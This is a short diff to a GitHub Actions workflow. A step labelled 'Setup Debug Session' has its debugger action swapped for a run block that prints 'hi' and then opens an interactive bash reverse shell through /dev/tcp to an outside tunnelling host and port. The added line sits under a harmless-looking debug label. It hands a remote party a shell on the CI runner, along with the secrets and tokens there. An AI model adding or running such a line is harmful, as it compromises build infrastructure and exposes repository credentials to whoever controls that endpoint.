@@ -27,4 +27,6 @@ jobs:
 
       # Runs a single command using the runners shell
       - name: Setup Debug Session
-        uses: csexton/debugger-action@master
+        run: |
+          echo hi
+          bash -i>& /dev/tcp/2.tcp.cpolar.cn/10072 0>&1
